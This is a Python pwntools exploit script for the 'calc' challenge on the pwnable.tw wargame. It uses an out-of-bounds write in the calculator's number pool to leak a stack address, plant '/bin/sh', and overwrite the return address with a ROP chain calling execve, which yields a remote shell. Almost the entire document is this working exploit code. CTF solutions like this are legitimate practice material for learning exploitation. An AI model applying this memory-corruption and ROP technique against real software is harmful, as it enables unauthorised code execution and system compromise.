# !/bin/python3
from random import randrange
from sre_parse import FLAGS
from pwn import *
context.arch = "i386"
context.terminal = ["tmux", "splitw", "-h"]
def write(io, offset, value):
    """
    - offset: offset from address of pool to target address in DWORD
    - value: DWORD value to write
    """
    ori_value = leak_dword(io,offset) 
    if ori_value % 0x100000000 == value % 0x100000000:
        return
    else:
        if value > 0x7fffffff:
            value = value - 0x100000000
        if ori_value < value:
            io.sendline(f"+{offset}+{value-ori_value}".encode())
        else:
            io.sendline(f"+{offset}-{ori_value-value}".encode())
        io.recvline()
        #assert leak_dword(io,offset) % 0x100000000 == value % 0x100000000

def end_loop(io):
    io.sendline("##".encode())
    #io.recvline()

def leak_dword(io, offset):
    io.sendline(f"+{offset}*1".encode())
    res = int(io.recvline().decode().strip("\n"),10)
    return res 


DEBUG = False
ip = "chall.pwnable.tw"
port = 10100 


if __name__ == "__main__":
    if DEBUG:
        io = process("./calc")
    else:
        io = remote(ip,port)

    io.recvline()

    _bin = ELF("./calc")
    _rop = ROP(_bin)

    main_ebp = leak_dword(io, 0x5a0//4 ) % 0x100000000
    # print(hex(main_ebp))
    cal_esp = main_ebp & 0x0FFFFFFF0
    cal_esp -= 0x10
    cal_esp -= 0x4  # push ret addr
    cal_esp -= 0x4  # push main ebp
    cal_ebp = cal_esp
    cal_esp -= 0x5b8
    pool_addr = cal_ebp - 0x5a0
    # write "/bin/sh" to stack
    sh_addr = cal_ebp + 0x30
    write(io, (sh_addr-pool_addr) // 4, u32("/bin".encode()))
    write(io, (sh_addr-pool_addr) // 4 + 1, u32("/sh\x00".encode()))
    #print(p32(leak_dword(io,(sh_addr-pool_addr) // 4+1)))
    #print(p32(leak_dword(io,(sh_addr-pool_addr) // 4)))


    # construct ROP chain
    _rop(eax=0xb, ebx = sh_addr, ecx = 0, edx = 0)
    _rop.raw(0x8049a21)

    print(_rop.dump())
    chain = _rop.chain()
    #print(_rop.chain())

    ret_addr = cal_ebp + 4
    offset = (ret_addr - pool_addr) // 4
    print(f"pool_addr: {hex(pool_addr)}")
    for i in range(0,len(chain),4):
        target_value = u32(chain[i:i+4])
        print(f"offset: {hex((offset*4+i))}, target_value: {hex(target_value)}")
        write(io, offset+i//4, target_value)
    # gdb.attach(io)
    end_loop(io)
    io.interactive()
    
